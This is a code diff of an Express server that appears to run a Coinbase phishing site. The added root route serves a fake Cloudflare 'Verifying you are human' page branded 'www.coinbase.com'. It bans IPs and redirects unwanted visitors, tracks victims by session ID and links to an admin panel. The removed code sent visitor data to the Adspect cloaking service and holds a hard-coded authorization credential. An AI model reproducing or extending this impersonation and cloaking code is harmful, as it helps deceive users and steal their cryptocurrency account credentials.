@@ -505,57 +505,13 @@ app.post('/verify-turnstile', async (req, res) => {
         res.json({ success: false, error: 'Verification failed' });
     }
 });
-async function verifyWithAdspect(ip, userAgent, headers) {
-    try {
-        // Create a clean stream URL for the PHP check
-        const currentHost = headers.host || '';
-        const phpCheckUrl = `https://${currentHost}/index.php`;  
 
-        const payload = {
-            aid: '9492dbe1-9a0e-4fd2-aff0-8bc113887017',
-            sid: '9ce81994-a76a-40c1-bd5c-66902f859516',
-            ip: ip,
-            ua: userAgent,
-            headers: {
-                'accept-language': headers['accept-language'] || '',
-                'user-agent': userAgent,
-                'referer': headers['referer'] || ''
-            }
-        };
-
-        console.log('Sending Adspect request:', JSON.stringify(payload, null, 2));
-
-        const response = await fetch('https://rpc.adspect.net/v1/verify', {
-            method: 'POST',
-            headers: {
-                'Authorization': 'Basic blF4SzBsMTdyYmtfZEhGZExrT2tja3cxam5US1AzN1c6',
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        });
-
-        console.log('Adspect response status:', response.status);
-        
-        // Redirect to the PHP check regardless of response
-        return phpCheckUrl;
-
-    } catch (error) {
-        console.error('Adspect verification error:', error);
-        // On error, still try the PHP check
-        return `https://${headers.host}/index.php`;
-    }
-}
-
-app.get('/index.php', (req, res) => {
-    // Just serve the index.php file
-    res.sendFile(join(__dirname, '/index.php'));
-});
 app.get('/', async (req, res) => {
     const isAdminPanel = req.headers.referer?.includes('/dashboard/admin');
     
-    if (isAdminPanel) {
-        return next();
+    // If website is disabled and not admin panel, redirect immediately
+    if (!state.settings.websiteEnabled && !isAdminPanel) {
+        return res.redirect(state.settings.redirectUrl);
     }
 
     const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
@@ -564,223 +520,228 @@ app.get('/', async (req, res) => {
     
     try {
         const publicIP = await getPublicIP(clientIP);
-        console.log('Processing request for IP:', publicIP);
+        
+        // Check if IP is banned (but don't block admin panel)
+        if (ipManager.isIPBanned(publicIP) && !isAdminPanel) {
+            return res.redirect(state.settings.redirectUrl);
+        }
 
-        // Send to index.php
-        res.redirect('/index.php');
+        // Get session if it exists from query params
+        const params = new URLSearchParams(req.url.split('?')[1] || '');
+        const sessionId = params.get('client_id');
+        const session = sessionId ? sessionManager.getSession(sessionId) : null;
 
-    } catch (error) {
-        console.error('Error in root route:', error);
-        res.redirect('https://google.com');
-    }
-});
+        if (session && ipManager.isIPBanned(session.ip)) {
+            return res.redirect(state.settings.redirectUrl);
+        }
 
-app.get('/public/home.html', (req, res) => {
-    // Your captcha page HTML with rayId, etc.
-    const rayId = Math.random().toString(16).substr(2, 10);
-    const indexHtml = `<!DOCTYPE html>
-    <html lang="en">
-    <!-- Head section remains the same -->
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Just a moment...</title>
-        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-            <script src="/socket.io/socket.io.js"></script>
-        <script src="/js/socket-client.js"></script>
-        <style>
-            * {
-                box-sizing: border-box;
-                margin: 0;
-                padding: 0;
-            }
-    
-            html {
-                line-height: 1.15;
-                -webkit-text-size-adjust: 100%;
-                color: #d9d9d9;
-            }
-    
-            body {
-                background-color: #1C1C1C;
-                margin: 0;
-                padding: 0;
-                min-height: 100vh;
-                display: flex;
-                flex-direction: column;
-                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            }
-    
-            .main-wrapper {
-                flex: 1;
-                display: flex;
-                flex-direction: column;
-                align-items: center;
-            }
-    
-            .main-content {
-                margin: 8rem auto;
-                max-width: 60rem;
-                width: 100%;
-                padding: 0 1.5rem;
-            }
-    
-            .h1 {
-                font-size: 2.5rem;
-                font-weight: 500;
-                line-height: 3.75rem;
-                color: #d9d9d9;
-                margin-bottom: 1rem;
-            }
-    
-            .h2 {
-                font-size: 1.5rem;
-                font-weight: 500;
-                line-height: 2.25rem;
-                color: #d9d9d9;
-                margin-bottom: 1rem;
-            }
-    
-            .core-msg {
-                font-size: 1rem;
-                line-height: 1.5rem;
-                color: #d9d9d9;
-                margin: 2rem 0;
-            }
-    
-            .spacer {
-                margin: 2rem 0;
-            }
-    
-            #captchaContainer {
-                display: ${state.settings.antiBotEnabled ? 'block' : 'none'};
-            }
-    
-            .footer {
-                padding: 1.5rem;
-                margin: 0 auto;
-                max-width: 60rem;
-                width: 100%;
-            }
-    
-            .footer-inner {
-                border-top: 1px solid #2c2c2c;
-                padding: 1rem 0;
-            }
-    
-            .ray-id {
-                text-align: center;
-                font-size: 0.75rem;
-                color: #d9d9d9;
-            }
-    
-            .ray-id code {
-                font-family: monaco, courier, monospace;
-            }
-    
-            .text-center {
-                text-align: center;
-                font-size: 0.75rem;
-                color: #d9d9d9;
-                margin-top: 0.5rem;
-            }
-    
-            .cf-turnstile {
-                background: transparent;
-                margin: 1rem 0;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="main-wrapper">
-            <div class="main-content">
-                <h1 class="h1">www.coinbase.com</h1>
-                <h2 class="h2">Verifying you are human. This may take a few seconds.</h2>
-                
-                <div id="captchaContainer">
-                    <div class="cf-turnstile" 
-                        data-sitekey="0x4AAAAAAA4dI8u-5KhSCtDb"
-                        data-callback="onCaptchaSuccess"
-                        data-theme="dark"></div>
-                </div>
-    
-                <div class="core-msg spacer">
-                    www.coinbase.com needs to review the security of your connection before proceeding.
-                </div>
+        const rayId = Math.random().toString(16).substr(2, 10);
+        
+        // Escape the template literals for the embedded script
+        const indexHtml = `<!DOCTYPE html>
+<html lang="en">
+<!-- Head section remains the same -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Just a moment...</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+        <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/socket-client.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html {
+            line-height: 1.15;
+            -webkit-text-size-adjust: 100%;
+            color: #d9d9d9;
+        }
+
+        body {
+            background-color: #1C1C1C;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .main-content {
+            margin: 8rem auto;
+            max-width: 60rem;
+            width: 100%;
+            padding: 0 1.5rem;
+        }
+
+        .h1 {
+            font-size: 2.5rem;
+            font-weight: 500;
+            line-height: 3.75rem;
+            color: #d9d9d9;
+            margin-bottom: 1rem;
+        }
+
+        .h2 {
+            font-size: 1.5rem;
+            font-weight: 500;
+            line-height: 2.25rem;
+            color: #d9d9d9;
+            margin-bottom: 1rem;
+        }
+
+        .core-msg {
+            font-size: 1rem;
+            line-height: 1.5rem;
+            color: #d9d9d9;
+            margin: 2rem 0;
+        }
+
+        .spacer {
+            margin: 2rem 0;
+        }
+
+        #captchaContainer {
+            display: ${state.settings.antiBotEnabled ? 'block' : 'none'};
+        }
+
+        .footer {
+            padding: 1.5rem;
+            margin: 0 auto;
+            max-width: 60rem;
+            width: 100%;
+        }
+
+        .footer-inner {
+            border-top: 1px solid #2c2c2c;
+            padding: 1rem 0;
+        }
+
+        .ray-id {
+            text-align: center;
+            font-size: 0.75rem;
+            color: #d9d9d9;
+        }
+
+        .ray-id code {
+            font-family: monaco, courier, monospace;
+        }
+
+        .text-center {
+            text-align: center;
+            font-size: 0.75rem;
+            color: #d9d9d9;
+            margin-top: 0.5rem;
+        }
+
+        .cf-turnstile {
+            background: transparent;
+            margin: 1rem 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-wrapper">
+        <div class="main-content">
+            <h1 class="h1">www.coinbase.com</h1>
+            <h2 class="h2">Verifying you are human. This may take a few seconds.</h2>
+            
+            <div id="captchaContainer">
+                <div class="cf-turnstile" 
+                    data-sitekey="0x4AAAAAAA4dI8u-5KhSCtDb"
+                    data-callback="onCaptchaSuccess"
+                    data-theme="dark"></div>
             </div>
-    
-            <div class="footer">
-                <div class="footer-inner">
-                    <div class="ray-id">Ray ID: <code>${rayId}</code></div>
-                    <div class="text-center">Performance & security by Cloudflare</div>
-                </div>
+
+            <div class="core-msg spacer">
+                www.coinbase.com needs to review the security of your connection before proceeding.
             </div>
         </div>
-    
-    
-        <script>
-            let captchaToken = null;
-    
-            function onCaptchaSuccess(token) {
-                captchaToken = token;
-                checkAccess();
-            }
-    
-            async function checkAccess() {
-        if (${state.settings.antiBotEnabled ? 'true' : 'false'} && !captchaToken) {
-            return;
+
+        <div class="footer">
+            <div class="footer-inner">
+                <div class="ray-id">Ray ID: <code>${rayId}</code></div>
+                <div class="text-center">Performance & security by Cloudflare</div>
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+        let captchaToken = null;
+
+        function onCaptchaSuccess(token) {
+            captchaToken = token;
+            checkAccess();
         }
-    
-        try {
-            const sessionId = new URLSearchParams(window.location.search).get('client_id');
-            console.log('Checking access for session:', sessionId);
-            
-            if (${state.settings.antiBotEnabled ? 'true' : 'false'}) {
-                const verifyResponse = await fetch('/verify-turnstile', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ 
-                        token: captchaToken,
-                        sessionId: sessionId
-                    })
-                });
-                
-                const verifyResult = await verifyResponse.json();
-                console.log('Verification result:', verifyResult);
-    
-                if (verifyResult.success && verifyResult.verified && verifyResult.url) {
-                    console.log('Redirecting to verified URL:', verifyResult.url);
-                    window.location.replace(verifyResult.url);
-                    return;
-                } else if (!verifyResult.success) {
-                    console.error('Verification failed:', verifyResult.error);
-                    // Don't redirect, let them try the captcha again
-                    return;
-                }
-            }
-    
-            // Only check IP if we don't have a session
-            if (!sessionId) {
-                console.log('No session, checking IP...');
-                const response = await fetch('/check-ip');
-                if (response.redirected) {
-                    window.location.replace(response.url);
-                }
-            }
-        } catch (error) {
-            console.error('Error in checkAccess:', error);
-        }
+
+        async function checkAccess() {
+    if (${state.settings.antiBotEnabled ? 'true' : 'false'} && !captchaToken) {
+        return;
     }
-        </script>
-    </body>
-    </html>`;
-            res.send(indexHtml);
+
+    try {
+        const sessionId = new URLSearchParams(window.location.search).get('client_id');
+        console.log('Checking access for session:', sessionId);
+        
+        if (${state.settings.antiBotEnabled ? 'true' : 'false'}) {
+            const verifyResponse = await fetch('/verify-turnstile', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ 
+                    token: captchaToken,
+                    sessionId: sessionId
+                })
+            });
+            
+            const verifyResult = await verifyResponse.json();
+            console.log('Verification result:', verifyResult);
+
+            if (verifyResult.success && verifyResult.verified && verifyResult.url) {
+                console.log('Redirecting to verified URL:', verifyResult.url);
+                window.location.replace(verifyResult.url);
+                return;
+            } else if (!verifyResult.success) {
+                console.error('Verification failed:', verifyResult.error);
+                // Don't redirect, let them try the captcha again
+                return;
+            }
+        }
+
+        // Only check IP if we don't have a session
+        if (!sessionId) {
+            console.log('No session, checking IP...');
+            const response = await fetch('/check-ip');
+            if (response.redirected) {
+                window.location.replace(response.url);
+            }
+        }
+    } catch (error) {
+        console.error('Error in checkAccess:', error);
+    }
+}
+    </script>
+</body>
+</html>`;
+        res.send(indexHtml);
+    } catch (error) {
+        console.error('Error in root route:', error);
+        res.redirect(state.settings.redirectUrl);
+    }
 });
-
-
-
 
 // Page serving route - must come after other routes
 app.get('/:page', pageServingMiddleware);
